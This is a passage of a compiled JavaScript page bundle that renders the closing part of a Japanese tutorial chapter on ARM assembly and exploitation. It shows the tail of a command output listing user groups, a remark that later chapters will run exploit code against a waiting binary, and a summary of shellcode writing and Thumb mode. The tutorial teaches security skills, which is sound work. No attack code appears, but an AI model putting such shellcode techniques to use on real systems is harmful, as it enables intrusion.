punctuation"}},[t._v(")")]),t._v(",105"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("input"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",109"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("netdev"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",997"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gpio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",998"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i2c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",999"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("spi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[t._v("続く章でも同じような手順で、バイナリを待ち受けて、Exploit コードを実行していきます。")]),t._v(" "),s("h2",{attrs:{id:"_1-4-まとめ"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-4-まとめ","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.4 まとめ")]),t._v(" "),s("p",[t._v("本章では、ARMアセンブリの基本からシェルコードの作成と実行まで幅広く見てきました。ARMアセンブリは、x86と違う点が多く少しむずかしいですが、Exploit をする上ではThumbモードなど重要な要素がとても多く絡んできます。適切に理解することで、他の攻撃手法を正しく理解できるようになると思います。")])])}),[],!1,null,null,null);a.default=n.exports}}]);